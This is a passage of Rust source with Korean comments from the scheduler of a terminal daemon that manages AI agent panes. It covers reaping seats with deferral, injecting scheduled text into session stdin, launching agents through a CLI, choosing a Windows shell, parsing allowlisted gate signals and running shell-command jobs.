/// ★(성찰 A4 · blocking) fresh 좌석의 **회수** — 미완료 항목이 있으면 닫지 않는다.
///
/// 종전 배선: `sleep(ttl)` → 처분을 최대 1,800초 기다림 → **무조건** `close_surface(Reap)`.
/// 그 마지막 한 줄이 조건 없는 폐기였다. `push_queued + fresh:true + close_after_secs:0`
/// (→ 하한 60초) 적재 후 승인 대기가 1,800초를 넘으면 활성 큐에 항목이 남아 있는데도 좌석이
/// 닫히고, 그 항목은 `record_active_drain(…, "surface_closed")` + `queue.dropped` 로 폐기된다 —
/// 잡의 일감은 끝내 실행되지 않는데 그 사실은 이미 `schedule.fired{detail:"queued"}`(성공)로
/// 보고된 뒤다. 게다가 [`surface_queue_pending`] 은 좌석이 사라지면 `false` 라
/// "처분이 정해졌다" 와 "좌석이 없어졌다" 가 **같은 모양**이었다.
///
/// 이제 시간 상한은 **회수 보류 + 안내 이벤트**다: 유예([`QUEUED_DELIVERY_GRACE_SECS`])를
/// 넘기면 `schedule.fresh_reap_deferred` 를 한 번 내고(그 뒤로는
/// [`QUEUED_DEFER_NOTICE_INTERVAL_SECS`] 간격으로 되풀이) **계속 기다린다**. 대기의 실질
/// 상한은 큐 항목 자신의 TTL 이 진다 — 배달이든 만료든 처분이 정해지면 즉시 회수된다.
/// 좌석이 이미 사라진 경우도 `close_surface` 가 멱등이라 그대로 지나간다.
/// 회수 타이머의 **네 시간축** — 프로덕션은 상수에서, 검체는 같은 비율의 압축 시계에서 만든다
/// (`tokio` 의 `test-util`(가상시간)은 이 크레이트의 feature 집합에 없다 — 축을 값으로 빼서
///  같은 배선을 그대로 돌린다). 세 번째와 네 번째가 종전에 **한 상수**로 묶여 있었다.
#[derive(Clone, Copy, Debug)]
struct ReapTiming {
    /// 좌석 회수까지의 기본 유예(잡의 `close_after_secs` · 큐 경유면 하한 60초).
    ttl: Duration,
    /// 처분 미정 상태에서 **안내를 내기 시작하는** 경계(회수 시각이 아니다).
    grace: Duration,
    /// 처분 확인 간격.
    poll: Duration,
    /// 유예를 넘긴 뒤 안내를 되풀이하는 간격.
    notice: Duration,
}

impl ReapTiming {
    fn for_job(ttl_secs: u64) -> Self {
        Self {
            ttl: Duration::from_secs(ttl_secs),
            grace: Duration::from_secs(QUEUED_DELIVERY_GRACE_SECS),
            poll: Duration::from_secs(QUEUED_CLOSE_POLL_SECS),
            notice: Duration::from_secs(QUEUED_DEFER_NOTICE_INTERVAL_SECS),
        }
    }

    /// 검체 전용 — **1000배 압축**(1초 → 1밀리초). 경계 건수·순서는 프로덕션과 동일하다.
    #[cfg(test)]
    fn compressed(ttl_secs: u64) -> Self {
        Self {
            ttl: Duration::from_millis(ttl_secs),
            grace: Duration::from_millis(QUEUED_DELIVERY_GRACE_SECS),
            poll: Duration::from_millis(QUEUED_CLOSE_POLL_SECS),
            notice: Duration::from_millis(QUEUED_DEFER_NOTICE_INTERVAL_SECS),
        }
    }
}

async fn reap_fresh_seat(
    d: Arc<Daemon>,
    sid: u64,
    job_id: String,
    t: ReapTiming,
    await_disposition: bool,
) {
    tokio::time::sleep(t.ttl).await;
    if await_disposition {
        let mut waited = Duration::ZERO;
        let mut since_notice = t.notice;
        // ★좌석 소멸과 처분 확정을 **가른다**: 좌석이 없어졌으면 더 기다릴 대상이 없다.
        //   ([`surface_queue_pending`] 하나만 보면 두 사실이 같은 `false` 로 접힌다.)
        while d.get_surface(sid).is_some() && surface_queue_pending(&d, sid) {
            if waited >= t.grace && since_notice >= t.notice {
                d.bus.publish(
                    "schedule.fresh_reap_deferred",
                    "schedule",
                    Some(sid),
                    json!({"job": job_id, "surface_id": sid,
                           "waited_secs": waited.as_secs(), "waited_ms": waited.as_millis() as u64,
                           "grace_secs": QUEUED_DELIVERY_GRACE_SECS,
                           "note": "적재된 일감의 처분이 아직 정해지지 않았다 — 좌석을 회수하지 않는다(회수하면 그 일감이 폐기된다)"}),
                );
                since_notice = Duration::ZERO;
            }
            tokio::time::sleep(t.poll).await;
            waited += t.poll;
            since_notice += t.poll;
        }
    }
    let _ = crate::governance::close_surface(&d, sid, crate::governance::CloseCause::Reap);
}

/// 그 좌석의 활성 큐에 아직 배달되지 않은 항목이 남아 있는가(처분 미정) — 좌석이 없으면 false.
fn surface_queue_pending(daemon: &Arc<Daemon>, sid: u64) -> bool {
    daemon
        .get_surface(sid)
        .is_some_and(|s| !s.pending_queue.lock().unwrap_or_else(|e| e.into_inner()).is_empty())
}

/// 라벨이 없으면 `[schedule <job-id>] ` 을 앞에 붙인다(실물 라벨 규약 `[wakeup <W-id>]` 와 동형).
fn ensure_machine_label(text: &str, job_id: &str) -> String {
    if has_machine_label(text) {
        return text.to_string();
    }
    format!("[schedule {job_id}] {text}")
}

/// 대상 좌석을 **한 임계영역**에서 확정한다 — 존재·생존·역할 결속을 함께 본다.
/// 락 순서: surfaces → roles(`close_surface`·`claim_role` 과 동순 · AB-BA 없음).
fn resolve_push_target(
    daemon: &Arc<Daemon>,
    sid: u64,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
) -> Result<Arc<crate::state::Surface>, String> {
    let surfaces = daemon.surfaces.lock().unwrap();
    let surface = surfaces.get(&sid).cloned().ok_or("surface gone")?;
    if let Some(guard) = role_guard {
        let roles = daemon.roles.lock().unwrap();
        if !roles.iter().any(|(r, s)| *s == sid && guard.matches(r)) {
            return Err("role handed over between selection and inject".to_string());
        }
    }
    Ok(surface)
}

/// 살아있는 세션의 stdin에 과업을 주입 (bracketed paste + Return).
/// 전체 시퀀스가 writer 스레드의 단일 Inject 항목으로 직렬화돼
/// 동시 발화·동시 배달과 섞이지 않는다 (메시지 병합·오염 차단).
/// 확정된 좌석에 주입한다(조회를 다시 하지 않는다 — 확정과 주입 사이에 좌석이 바뀌지 않게).
///
/// ★(0.14.43 · C8) **인계에 성공하면 그 좌석의 미제출 입력 계수를 0 으로 계상한다** — 큐 배달 인계(`governance::deliver_head_locked`)와 같은 규약이다.
/// Inject 는 본문+CR 을 원자로 보내 **줄을 제출**한다 — 인계된 Inject 가 쓰이면 줄이 제출된다고 계상한다(인계 시점에는 아직 쓰기 전이고 CR 이 삼켜져 본문이 남을 수도 있다 — 아래 계상 주석).
/// 종전에는 이 경로만 계수를 건드리지 않아, 유령 계수(윈도우·
/// `CYS_PENDING_INPUT_MODEL=v2` 좌석의 단독 Esc · 글자를 치고 전부 지운 줄)가 있는 좌석에 하트비트가 들어가도 계수가 남아 그 좌석의 큐 배달이
/// 계속 `input_pending` 으로 막혔다(실측: push 뒤 `pending=1·human=1` 잔존). **게이트(보류·전환 판정)는 이 함수 앞 `deliver_push` 의 H0 이고 무변경이다** —
/// 여기서는 이미 통과한 주입의 사실만 계상한다. 노브 `CYS_SCHEDULE_PUSH_COUNTS_SUBMIT=0` 이면 종전(계수·게이트 무접촉)이다.
///
/// 【임계영역】 인계(`try_send`)와 계상을 **한 `input_gate` 안**에서 한다 — 큐 인계 지점과 같다. 갈라서 게이트 밖에서 계상하면 그 사이에 끼어든 직접 send
/// (`send_text`: 게이트 안에서 쓰고 계수를 올린다)의 계수를 0 으로 덮어 과소 계수(= 초안 위 오주입 방향)를 만든다.
/// 재진입·교착 없음(호출 사슬을 코드로 확인): `fire`(tick·`run_now` 가 띄운 태스크) → `fire_push` → `deliver_push` → 여기 — 이 파일에서 `input_gate` 를 잡는 곳은 여기 하나뿐이고
/// 게이트를 쥔 호출자도 없다. 락 순서 `pending_queue → input_gate` 는 `pending_queue` 를 잡지 않으므로 지킨다. 게이트 안은 `try_send`(비차단) · 원자 판독/쓰기 ·
/// `pending_input`(leaf) 뿐이다 — 원장 append(디스크 I/O)는 게이트 **앞**, 이벤트 발행은 게이트 **뒤**(호출자)다.
/// `try_send` 실패(채널 가득·writer 종료)는 쓰이지 않았으므로 계수를 건드리지 않는다. 인계 뒤 좌석이 종료돼도 0 은 무해하다(종료 좌석의 계수는 판정에 쓰이지 않는다 — 틱은 `exited` 좌석을 건너뛴다).
///
/// 반환 `Some` = 계수가 **0 이 아닌 값에서** 0 으로 내려갔다(관측 이벤트 대상). `None` = 0→0 이거나 노브가 꺼졌다.
fn inject_on(
    daemon: &Arc<Daemon>,
    surface: &Arc<crate::state::Surface>,
    text: &str,
) -> Result<Option<PushClearedPending>, String> {
    let sid = surface.id;
    // ★(0.14.42 · 설계 C D3) 잡 문안은 사용자 입력이다 — 원장 선기록 앞에서 살균해 원장과 주입 본문을 맞춘다
    //   (writer 백스톱과 같은 값 · 표지 없는 문안은 할당 0 · 바이트 동일).
    let text = cys::paste_fence::sanitize(text);
    // ★R1 배달 원장 — 주입보다 앞(delivery.rs 불변식 ①). 자기 예약 wake
    //   (`cys schedule add --text "[wakeup] 다음 액션 착수" --to master`)가 시간이 지나
    //   stdin 으로 돌아오는 경로가 바로 여기다.
    crate::delivery::record_audited(
        daemon,
        sid,
        &text,
        crate::delivery::Origin::Schedule,
        None,
    );
    // ★(0.14.43 · C8) 게이트는 원장 선기록 **뒤** · 인계 **앞**에서 잡는다(디스크 I/O 를 게이트 안에 넣지 않는다). 노브가 꺼졌으면 잡지 않는다(종전 byte-identical).
    let gate = schedule_push_counts_submit()
        .then(|| surface.input_gate.lock().unwrap_or_else(|e| e.into_inner()));
    surface
        .write_tx
        .try_send(crate::state::WriteReq::Inject {
            text: text.into_owned(),
            cr_delay_ms: 500,
            clear_first: false, // 스케줄 발화는 현행 동작 보존
            guard: None,        // 스케줄 push 는 큐를 우회한다(§8) — 가드 대상 아님
        })
        .map_err(|e| match e {
            std::sync::mpsc::TrySendError::Full(_) => {
                "surface write channel full (pane stalled)".to_string()
            }
            std::sync::mpsc::TrySendError::Disconnected(_) => "surface writer closed".to_string(),
        })?;
    // 인계 성공 — 노브가 꺼졌으면(게이트를 잡지 않았다) 종전 그대로 끝낸다(계수 무접촉).
    if gate.is_none() {
        return Ok(None);
    }
    // ★큐 인계 지점(`deliver_head_locked`)과 같은 계상 — 줄을 제출했으니 미제출 계수 0: `set_pending_input(0)` = 미러 0 · 세대 `input_gen` +1(owner 각인은 세대로 자동 무효).
    //   `set_pending_input` 은 `PendingInputState.human` 을 건드리지 않는다(큐 인계는 계수 0 인 줄에서만 일어나 사람 몫도 이미 0 이다). 여기서는 0 이 아닌 줄을 0 으로 내리므로
    //   사람 몫도 함께 0 으로 접는다 — 남기면 raw `human` 을 읽는 `draft_machine_owned`·`draft_divert_step` 이, 이 push 의 CR 이 삼켜져 남은 잔여를 사람 초안으로 오인한다.
    let prev_bytes = surface.pending_input_bytes.load(std::sync::atomic::Ordering::Relaxed);
    let prev_human_bytes = {
        let mut st = surface.pending_input.lock().unwrap_or_else(|e| e.into_inner());
        let human = st.human.min(prev_bytes);
        st.human = 0;
        // ★(0.14.43 · R1F-IN ⓐ) 줄을 제출했다고 계상하면 잠정 Esc 면제 표식(`esc_exempt_pgid`)도 내린다 — 같은 leaf 임계영역에서 미러까지(큐 인계 `take_esc_exempt` 와 같은 규약).
        //   남기면 이미 제출된 줄 뒤에 에이전트가 전경에서 사라졌을 때 틱의 되돌리기가 헛 계수 1 을 세운다.
        st.esc_exempt_pgid = 0;
        #[cfg(unix)]
        surface.esc_exempt_pgid.store(0, std::sync::atomic::Ordering::Relaxed);
        human
    };
    surface.set_pending_input(0);
    drop(gate);
    Ok((prev_bytes != 0).then_some(PushClearedPending { prev_bytes, prev_human_bytes }))
}

/// ★(0.14.43 · C8) 직접 push 인계가 입력줄 미제출 계수를 **0 이 아닌 값에서** 0 으로 내렸다는 사실 — [`inject_on`] 이 돌려주고 [`note_push_cleared_pending`] 이 이벤트로 만든다.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct PushClearedPending {
    /// 계상 전 `pending_input_bytes`(전체 미제출 계수).
    prev_bytes: u64,
    /// 그중 사람 몫 — 불변식 `human ≤ count` 로 접은 값(진단 표면 `pending_input_human_bytes` 와 같은 읽기).
    prev_human_bytes: u64,
}

/// ★(0.14.43 · C8 · R1F-IN n-2) 순수 파서 — 노브 `CYS_SCHEDULE_PUSH_COUNTS_SUBMIT`(직접 push 인계 뒤 입력줄 계수를 0 으로 계상할지 · 기본 켬). **앞뒤 공백을 걷은 값이 `"0"` 일 때만 끈다**(= 종전 =
/// 계수·게이트 무접촉). 미설정·빈 값·그 밖의 값은 켬 — 이 노브는 안전 게이트가 아니라 계상의 롤백 손잡이다.
fn schedule_push_counts_submit_from_env(v: Option<&str>) -> bool {
    v.map(str::trim) != Some("0")
}

/// env 래퍼 — 호출마다 읽는다(프로세스 수명 1회 캐시가 아니다 · 같은 push 경로의 `CYS_MACHINE_INJECT_HOLD` 와 같은 `h_knob` 관례. 검체는 스레드 로컬 덮개로 값을 준다).
/// 발화(push)마다 1회라 틱 안 반복 읽기가 아니다.
fn schedule_push_counts_submit() -> bool {
    schedule_push_counts_submit_from_env(
        crate::governance::h_knob("CYS_SCHEDULE_PUSH_COUNTS_SUBMIT").as_deref(),
    )
}

/// ★(0.14.43 · C8) 직접 push 가 입력줄 계수를 0 으로 되돌렸다는 **관측용** 이벤트 1건 — 계수가 0 이 아닌 값에서 바뀐 경우에만 부른다([`inject_on`] 이 `None` 이면 호출되지 않는다).
/// 이름이 `alert.` 접두도 `alert_route::routable` 허용 목록도 아니어서 라우팅되지 않는다(경보가 아니다 · 검체로 핀 · `queue.input_pending_reset` 과 다른 이름).
fn note_push_cleared_pending(
    daemon: &Arc<Daemon>,
    surface: &Arc<crate::state::Surface>,
    job: &Job,
    cleared: PushClearedPending,
) {
    daemon.bus.publish(
        "schedule.push_cleared_pending",
        "schedule",
        Some(surface.id),
        json!({"surface_ref": cys::surface_ref(surface.id),
               "prev_bytes": cleared.prev_bytes,
               "prev_human_bytes": cleared.prev_human_bytes,
               "job": job.id,
               "note": "직접 push 가 본문+CR 로 입력줄을 제출했다 — 미제출 입력 계수를 0 으로 계상했다(유령 계수 해소 · 큐 배달 인계와 같은 규약)"}),
    );
}

/// 부재 역할 자동 기동: 데몬이 형제 CLI의 launch-agent를 호출 (준비 폴링·지침 주입 재사용)
async fn launch_via_cli(daemon: &Arc<Daemon>, spec: &LaunchSpec) -> Result<u64, String> {
    use cys::SpawnPolicy;
    let cli = crate::state::sibling_cli_path();
    let mut cmd = tokio::process::Command::new(cli);
    cmd.arg("launch-agent")
        .arg("--role")
        .arg(&spec.role)
        .arg("--agent")
        .arg(&spec.agent)
        .env(
            cys::ENV_SOCKET,
            daemon.socket_path.to_string_lossy().as_ref(),
        )
        // ★U-7 결손 보강: 데몬이 낳는 **다른 CLI 자식은 전부** 이걸 걸고 있었는데
        // (main.rs 의 office-bridge·auto-restore·phoenix self-test) 여기만 빠져 있었다.
        // 없으면 이 자식 cys 가 소켓 연결에 실패했을 때 `spawn_detached_daemon` 으로
        // **라이벌 데몬을 낳는다** — 데몬 종료 중·소켓 교체 중에 정확히 그 창이 열린다.
        // 자기 데몬이 자기 경쟁자를 스폰하는 재귀 기동은 폭주(치명위험 ①) 경로다.
        .no_autostart()
        // ★U-7 등급 `Attached` — 아래에서 `.output()` 으로 **끝까지 기다리는** 유계 자식이다.
        // 분리하면 안 된다: 부모가 죽으면 함께 죽는 것이 정상 동작이고, 떼는 순간
        // 180초 상한이 걸린 이 호출이 남긴 자식이 고아로 잔존한다.
        // (flag 는 종전 `hide_console()` 과 동일한 CREATE_NO_WINDOW — 행동 무변경.)
        .spawn_policy(cys::ChildLifetime::Attached);
    if let Some(cwd) = &spec.cwd {
        cmd.arg("--cwd").arg(cwd);
    }
    // hang된 launch-agent가 fire 태스크를 영구 점유하지 않게 상한
    let out = tokio::time::timeout(Duration::from_secs(180), cmd.output())
        .await
        .map_err(|_| "launch-agent timed out (180s)".to_string())?
        .map_err(|e| format!("launch-agent spawn failed: {e}"))?;
    // ★(U-11) 종전엔 `success()` 1비트였다 — '깨졌다'와 '떴는데 사람이 관문을 통과시켜야
    //   한다'가 같은 값이었고, 그래서 진단 문안이 늘 "기동 실패"였다. 이제 세 갈래로 읽는다:
    //   성공 / **사람 필요**(surface 는 살아 있다) / 그 밖 실패.
    //   ★보류는 여전히 `Err` 다 — 그것이 이 함수의 계약에서 옳다. 호출부는 반환된 sid 에
    //   **곧바로 텍스트를 주입**하는데(`inject(daemon, sid, text)`), 관문 창에 주입하면 그
    //   붙여넣기의 Return 이 실측상 면책 창의 `No, exit` 을 눌러 노드를 종료시킨다.
    //   즉 여기서 Ok 를 내는 것은 '스케줄 job 한 건 성공' 이 아니라 '노드 1개 사망' 이다.
    if out.status.code() == Some(cys::EXIT_GATE_PENDING) {
        return Err(format!(
            "launch-agent gate-pending: pane 은 떴고 프로세스도 살아 있으나 첫기동 관문(테마·\
             로그인방식·OAuth·폴더신뢰·면책·새기능안내)에 갇혀 입력을 받지 못한다 — 좌석은 \
             닫지 않았다. 사람이 그 pane 에서 관문을 1회 통과시킨 뒤 재시도하라(`cys list` 로 \
             해당 pane 확인).\n{}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    if !out.status.success() {
        return Err(format!(
            "launch-agent failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    // launch-agent는 마지막 줄에 surface ref를 출력한다
    let sid = String::from_utf8_lossy(&out.stdout)
        .lines()
        .rev()
        .find_map(|l| aiterm_parse(l.trim()))
        .ok_or("launch-agent did not print a surface ref")?;
    Ok(sid)
}

fn aiterm_parse(s: &str) -> Option<u64> {
    cys::parse_surface_ref(s)
}

/// ★0.14.1 수리 세대 마커 — 릴리스 게이트(scripts/verify_win_crt.py)가 출하 cysd 바이너리에서
/// 이 바이트열의 실재를 단언해 구베이스(0.14.3 이하) 빌드 출하를 차단한다.
/// **live RPC 가 참조하는 상수**라 어떤 플랫폼 링커도 제거할 수 없다 — `#[used]` static 은
/// MSVC link.exe 의 미참조 제거(/OPT:REF)에 소거됨을 CI run 30359522750 에서 실증(0/1),
/// 코드 경로 문자열 휴리스틱은 run 30357918475 에서 붕괴(부분열·컴파일러 재량). 3세대 메커니즘.
/// 부수 효용: `cys schedule list`(status RPC)에 fix_generation 으로 노출 — 현장 진단에서
/// 설치본의 수리 세대를 즉시 판별할 수 있다.
pub const FIX_GENERATION: &str = "cys-fix-w2-gen-0.14.4";

/// 후보 디렉토리에서 동봉 `bash.exe` 절대경로를 찾는다(순수 — 회귀 핀·OS 무관 컴파일).
/// 첫 실재 파일이 승자(후보 순서 = 우선순위). 없으면 None.
#[cfg(any(windows, test))]
fn resolve_bash_in(dirs: impl IntoIterator<Item = PathBuf>) -> Option<PathBuf> {
    dirs.into_iter()
        .map(|d| d.join("bash.exe"))
        .find(|c| c.is_file())
}

/// Windows 동봉 bash 후보 디렉토리(우선순위 순). runtime_bin_dirs(실재 디렉토리만)가 SOT이고,
/// PortableGit 의 `bash.exe` 정규 위치(`runtime/git/bin`)를 보수적으로 덧댄다 — runtime_bin_dirs 는
/// PATH 주입용이라 git/bin 을 싣지 않는데(그 자리엔 sh·bash 뿐), 셸 탐지는 그 디렉토리가 본진이다.
#[cfg(windows)]
fn windows_bash_candidates(exe_dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut dirs = cys::runtime_bin_dirs(exe_dir);
    dirs.push(exe_dir.join("runtime").join("git").join("bin"));
    dirs
}

/// 플랫폼별 셸 호출자 (program, flag).
/// Windows: **동봉 Git Bash 우선**(v0.13.22 백포트 · 2026-07-28). 데몬 built-in 잡 페이로드는 전부
///   POSIX 문법(`${VAR:-...}` 전개·`;` 연쇄·printf/tail 파이프)이라 cmd.exe 로는 파싱조차 되지 않아
///   윈도우 전원에서 주기 잡이 통째로 불능이었다. 동봉 PortableGit 의 bash.exe 를 찾으면
///   (절대경로, "-c")로 승격하고, 미탐지(비동봉 설치)일 때만 종전 cmd 폴백을 유지한다.
///   탐지는 프로세스 1회만(OnceLock) — 매 발화 파일시스템 조회를 피한다.
/// unix: 종전 그대로 ("sh","-c") — 무변경.
fn command_shell() -> (String, &'static str) {
    #[cfg(windows)]
    {
        static BASH: std::sync::OnceLock<Option<String>> = std::sync::OnceLock::new();
        let found = BASH.get_or_init(|| {
            std::env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.to_path_buf()))
                .and_then(|d| resolve_bash_in(windows_bash_candidates(&d)))
                .map(|p| p.to_string_lossy().into_owned())
        });
        match found {
            Some(bash) => (bash.clone(), "-c"),
            None => ("cmd".to_string(), "/C"),
        }
    }
    #[cfg(not(windows))]
    {
        ("sh".to_string(), "-c")
    }
}

/// 폴백 경고 재발행 판정(순수 — 회귀 핀·OS 무관 컴파일). cmd 폴백(flag=="/C")일 때
/// 미발행(last=0)이거나 마지막 발행에서 1시간 이상 지났으면 true.
/// ★R2 codex medium 수용: 종전 프로세스당 1회(AtomicBool)는 첫 발행이 구독자 부재 시점에
/// 떨어지면 프로세스 생존 내내 재발행이 없어 사실상 무음으로 회귀했다 — 유계 재발행으로 교체.
#[cfg(any(windows, test))]
fn should_warn_fallback(flag: &str, last_emit_epoch: u64, now_epoch: u64) -> bool {
    const THROTTLE_SECS: u64 = 3600;
    if flag != "/C" {
        return false;
    }
    last_emit_epoch == 0 || now_epoch.saturating_sub(last_emit_epoch) >= THROTTLE_SECS
}

/// ★폴백 가시화(0.14.1 강화 — 상류에 없음): Windows에서 동봉 bash 미탐지로 cmd /C 폴백이 선택되면
/// schedule.warning 을 발행한다(시간당 최대 1회 — should_warn_fallback). 폴백은 POSIX 페이로드 잡의
/// 확정 실패 경로인데, 종전엔 그 사실 자체가 어디에도 표면화되지 않았다(무음 금지 원칙). 실패 개별
/// 건은 A1(schedule.error)이 잡고, 이 경고는 "왜 전부 실패하는가"의 근본 원인을 알린다.
/// command·text_command **양 경로 공통**으로 호출한다(fire_command·fire_push).
#[cfg(windows)]
fn warn_shell_fallback(daemon: &Arc<Daemon>, flag: &str) {
    use std::sync::atomic::{AtomicU64, Ordering};
    static LAST_EMIT: AtomicU64 = AtomicU64::new(0);
    let now = now_epoch() as u64;
    let last = LAST_EMIT.load(Ordering::Relaxed);
    if should_warn_fallback(flag, last, now)
        && LAST_EMIT
            .compare_exchange(last, now, Ordering::Relaxed, Ordering::Relaxed)
            .is_ok()
    {
        daemon.bus.publish(
            "schedule.warning",
            "schedule",
            None,
            json!({"kind": "shell-fallback",
                   "detail": "동봉 bash.exe 미탐지 — cmd /C 폴백. POSIX 페이로드 잡은 실패한다(schedule.error 로 개별 표면화)"}),
        );
    }
}

/// 스케줄 발화 자식에 얹을 env 주입 쌍 — ★T-0147-7 W1a(A17)에서 **`cys::spawn_env_pairs` 로 승격**했다.
/// 같은 규약(PATH 선두주입 + HOME←USERPROFILE backfill)이 pane 스폰(state.rs)에도 필요한데 사본이
/// 없어 Windows pane 이 `$HOME` 붕괴로 훅 발화를 잃었다 — 사본 증식 대신 lib 단일 소유로 옮겼다.
/// 회귀 핀(아래 `spawn_env_injects_runtime_path_and_backfills_home`)은 이제 `cys::spawn_env_pairs`
/// 를 직접 호출해 **lib 구현 자체**를 결박한다 — 사본이 아니라 SOT 를 검증한다(RC1).
///
/// ★SEAL-1 판정(2026-08-01): `schedule.json`·빌트인 잡의 `python3 …javis_*.py` 페이로드에는
/// `PYTHONDONTWRITEBYTECODE=1` 접두를 **넣지 않는다** — 잡은 전부 이 함수를 거쳐 스폰되고
/// `spawn_env_pairs` 가 그 쌍을 이미 싣기 때문이다(페이로드마다 접두를 박으면 잡이 추가될 때
/// 또 빠지는 규약 산재가 된다). 즉 잡 명령은 무변경이고 봉인은 env 상속으로 달성된다.
///
/// spawn_env_pairs 를 현재 프로세스 env 로 계산해 명령에 적용한다(run_text_command·fire_command 공용).
fn apply_spawn_env(cmd: &mut tokio::process::Command) {
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));
    for (k, v) in cys::spawn_env_pairs_from_process(&exe_dir) {
        cmd.env(k, v);
    }
}

/// ★T-0147-2 §1-B N6b / 층1 I2 — 게이트 신호 allowlist(deny-by-default).
///
/// 여기 없는 name 은 버린다. stdout 은 **신뢰 경계 밖**(잡이 임의 문자열을 찍는다)이라
/// 열어두면 미지 토큰이 `gate.*` 이벤트 이름 공간과 CC 배지판을 오염시킨다.
/// ★확장 시 python 게이트(`javis_report_gate.py`)와 **동시 갱신**할 것 — 한쪽만 늘리면
/// 게이트는 신호를 보내는데 데몬이 조용히 버리는 무음 고장이 된다.
const GATE_SIGNAL_ALLOWLIST: &[&str] = &["state_unwritable"];

/// 게이트 stdout 요약에서 기계 토큰 `gate_signal=<name>` 을 뽑는다(순수 — 부작용0·테스트 핀).
///
/// 왜 stdout 인가: 게이트가 state_dir 에 쓸 수 없으면 원장에도 badges.json 에도 아무 흔적을
/// 남길 수 없다 — 같은 state 를 oracle 로 기대하는 것이 자기모순(설계 R3-GATE)이다. stdout
/// 요약 1줄은 이미 `schedule.command_done` 텔레메트리에 실려 나가는 **확립된 채널**이라,
/// 새 채널을 만들지 않고 state 외부 oracle 을 얻는다.
///
/// 문법: `[a-z_]{1,40}`, 중복 제거, 상한 4(한 잡이 이벤트를 폭주시키지 못하게).
pub fn gate_signals_from_stdout(stdout: &str) -> Vec<String> {
    const TOKEN: &str = "gate_signal=";
    const MAX_SIGNALS: usize = 4;
    const MAX_NAME: usize = 40;
    let mut out: Vec<String> = Vec::new();
    for line in stdout.lines() {
        let mut rest = line;
        while let Some(pos) = rest.find(TOKEN) {
            let tail = &rest[pos + TOKEN.len()..];
            rest = tail; // 같은 줄의 다음 토큰까지 훑는다
            let name: String = tail
                .chars()
                .take_while(|c| c.is_ascii_lowercase() || *c == '_')
                .take(MAX_NAME + 1) // +1 로 받아 길이 초과를 '절단'이 아니라 '거부'로 판정
                .collect();
            if name.is_empty() || name.len() > MAX_NAME {
                continue;
            }
            if !GATE_SIGNAL_ALLOWLIST.contains(&name.as_str()) {
                continue;
            }
            if out.iter().any(|n| n == &name) {
                continue;
            }
            out.push(name);
            if out.len() >= MAX_SIGNALS {
                return out;
            }
        }
    }
    out
}

async fn fire_command(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let command = job
        .command
        .as_deref()
        .ok_or("command job missing 'command'")?;
    let (shell, flag) = command_shell();
    #[cfg(windows)]
    warn_shell_fallback(daemon, flag);
    let mut c = tokio::process::Command::new(shell);
    c.arg(flag).arg(command).hide_console();
    apply_spawn_env(&mut c); // run_text_command 와 동일 — 동봉 runtime PATH·HOME 주입
    let out = tokio::time::timeout(Duration::from_secs(600), c.output())
        .await
        .map_err(|_| "command timed out (600s)".to_string())?
        .map_err(|e| e.to_string())?;
    daemon.bus.publish(
        "schedule.command_done",
        "schedule",
        None,
        json!({"job_id": job.id, "exit": out.status.code(),
               "stdout_tail": String::from_utf8_lossy(&out.stdout).chars().rev().take(400).collect::<String>().chars().rev().collect::<String>()}),
    );
    // ★T-0147-2 §1-B N6b: stdout 기계 토큰 → 데몬 사실로 승격(state 외부 oracle).
    // 아래 exit≠0 Err 반환 **앞**에 두는 이유: 게이트는 항상 exit 0 이지만 계약은 종료코드와
    // 무관하다 — 실패 경로에서 신호가 증발하면 "쓰기 불능"을 알릴 유일한 채널이 닫힌다.
    for name in gate_signals_from_stdout(&String::from_utf8_lossy(&out.stdout)) {
        daemon.bus.publish(
            &format!("gate.{name}"),
            "alert",
            None,
            json!({"job_id": job.id, "signal": name}),
        );
        // CC 배지 축(alerts.rs) — 이벤트는 흘러가지만 배지는 TTL 동안 남아 사람이 본다.
        crate::alerts::note_gate_signal(&format!("gate.{name}"), json!({"job_id": job.id}));
    }
    // 실패 표면화: 종전엔 exit≠0 도 Ok 로 삼켜 schedule.fired 가 나갔다 — 잡이 매 주기 실패해도
    // 이벤트만 보면 '발화 성공'으로 읽혔다(무음 고장). run_text_command 와 같은 형태로 Err 를
    // 돌려 fire()가 schedule.error(job_id·exit·stderr 꼬리)를 발행하게 한다.
    // command_done 은 그대로 유지(exit·stdout 관측자 무회귀). 성공(exit 0) 경로는 무변경.
    if !out.status.success() {
        return Err(format!(
            "command 비정상 종료({:?}): {}",
            out.status.code(),
            String::from_utf8_lossy(&out.stderr)
                .chars()
                .rev()
                .take(200)
                .collect::<String>()
                .chars()
                .rev()
                .collect::<String>()
        ));
    }
    Ok(format!("command exit={:?}", out.status.code()))
}

/// CLI `schedule list`용: jobs + last_fired 스냅샷 + (U4-B2①) 잡별 결과 원장.
/// `last_fired` 는 "발화 시각"(발화 **전** 기록)이고, 결과는 `job_results` 가 말한다 —
/// 둘을 함께 봐야 "제때 돌았는데 매번 실패"를 구분한다. 원장은 데몬 메모리라 재시작 이후분만 있다.
pub fn status(daemon: &Daemon) -> serde_json::Value {
    let jobs = load_jobs();
    let state = load_state(daemon);
    let job_results = job_result_ledger()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .to_json();
    json!({
        "schedule_path": schedule_path().to_string_lossy(),
        "jobs": jobs,
        "last_fired": state.last_fired,
        "job_results": job_results,
        "job_results_scope": "daemon-memory (since daemon start)",
        // 수리 세대 노출(가산 필드) — 릴리스 게이트 마커의 live 참조 지점(링커 제거 불가 보장)
        "fix_generation": FIX_GENERATION,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::NaiveDate;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// ★R1 심층 방어 층3: schedule push 는 정의상 기계 유래 — 라벨 없는 문안이 master stdin 에
    /// 그대로 꽂히면 in-band 구별이 불가능했다(라운드1 검증자 임시 완화 ①). 데몬이 발화 시점에
    /// 강제 부착하며, 이미 라벨이 있으면 무접촉(기존 built-in 잡 무회귀).
    #[test]
    fn schedule_push_forces_machine_label_without_touching_labeled_text() {
        // 라벨 없음 → 강제 부착
